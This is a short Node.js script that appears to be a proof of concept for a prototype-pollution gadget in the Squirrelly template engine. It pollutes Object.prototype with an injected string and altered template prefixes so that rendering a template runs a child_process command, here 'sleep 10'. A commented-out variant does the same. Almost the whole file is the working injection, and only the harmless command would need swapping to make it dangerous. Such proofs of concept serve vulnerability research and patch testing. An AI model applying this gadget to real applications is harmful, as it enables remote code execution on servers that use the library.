var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

// chained gadgets!
// Object.prototype.n = "useScope');process.mainModule.require('child_process').execSync('sleep 10');return tR;}}, params:[it.kids]})\n//";
// Object.prototype.settings = {
//    'view options':{
//       prefixes: {
//          h: '@',
//          s: "#", // conflict! 
//          b: '#',
//          i: '',
//          r: '*',
//          c: '/',
//          e: '!',
//      }
//    }
// };

Object.prototype.n = "each')\nprocess.mainModule.require('child_process').execSync('sleep 10');\n//"
Object.prototype.settings = {
   'view options':{
      prefixes: {
         s: '',
     }
   }
};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });